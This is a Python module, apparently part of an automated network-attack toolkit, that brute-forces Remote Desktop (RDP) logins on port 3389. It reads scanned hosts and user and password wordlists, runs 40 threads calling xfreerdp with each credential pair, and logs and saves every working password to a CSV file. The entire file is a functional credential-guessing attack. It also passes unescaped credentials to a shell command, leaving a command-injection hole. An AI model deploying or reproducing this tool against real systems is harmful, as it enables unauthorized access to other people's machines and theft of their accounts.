"""
rdp_connector.py - This script performs a brute force attack on RDP services (port 3389) to find accessible accounts using various user credentials. It logs the results of successful connections.
"""

import os
import csv
import subprocess
import threading
import logging
import time
from queue import Queue
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="rdp_connector.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "RDPBruteforce"
b_module = "rdp_connector"
b_status = "brute_force_rdp"
b_port = 3389
b_parent = None

class RDPBruteforce:
    """
    Class to handle the RDP brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.rdp_connector = RDPConnector(shared_data)
        logger.info("RDPConnector initialized.")

    def bruteforce_rdp(self, ip, port):
        """
        Run the RDP brute force attack on the given IP and port.
        """
        logger.info(f"Running bruteforce_rdp on {ip}:{port}...")
        return self.rdp_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        logger.info(f"Executing RDPBruteforce on {ip}:{port}...")
        self.shared_data.bjornorch_status = "RDPBruteforce"
        success, results = self.bruteforce_rdp(ip, port)
        return 'success' if success else 'failed'

class RDPConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "3389")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.rdpfile = shared_data.rdpfile
        # If the file doesn't exist, it will be created
        if not os.path.exists(self.rdpfile):
            logger.info(f"File {self.rdpfile} does not exist. Creating...")
            with open(self.rdpfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for RDP ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "3389")

    def rdp_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an RDP service using the given credentials.
        Uses bundled xfreerdp (sfreerdp) in bin/ directory with +auth-only flag.
        """
        # Get path to bundled xfreerdp binary
        script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        xfreerdp_path = os.path.join(script_dir, "bin", "xfreerdp")

        # Fall back to system xfreerdp if bundled not found
        if not os.path.exists(xfreerdp_path):
            xfreerdp_path = "xfreerdp"

        command = f"{xfreerdp_path} /v:{adresse_ip} /u:{user} /p:{password} /cert:ignore +auth-only"
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                return True
            else:
                return False
        except subprocess.SubprocessError as e:
            return False

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
            if self.rdp_connect(adresse_ip, user, password):
                with self.lock:
                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                    self.save_results()
                    self.removeduplicates()
                    success_flag[0] = True
            self.queue.task_done()
            with self.progress_lock:
                self.progress_count += 1
                if self.progress_count % 50 == 0:
                    logger.info(f"Bruteforcing RDP... {self.progress_count}/{self.progress_total}")

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        # Find the row for this IP
        mac_address = ""
        hostname = ""
        for row in self.scan:
            if row.get('IPs') == adresse_ip:
                mac_address = row.get('MAC Address', '')
                hostname = row.get('Hostnames', '')
                break

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing RDP on {adresse_ip}... (0/{total_tasks})")

        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                while not self.queue.empty():
                    self.queue.get()
                    self.queue.task_done()
                break

        self.queue.join()

        for t in threads:
            t.join()

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        with open(self.rdpfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        rows = []
        header = None
        if os.path.exists(self.rdpfile):
            with open(self.rdpfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.rdpfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        rdp_bruteforce = RDPBruteforce(shared_data)
        logger.info("Starting RDP attack on port 3389...")

        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()

        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            logger.info(f"Executing RDPBruteforce on {ip}...")
            rdp_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total number of successes: {len(rdp_bruteforce.rdp_connector.results)}")
        exit(len(rdp_bruteforce.rdp_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
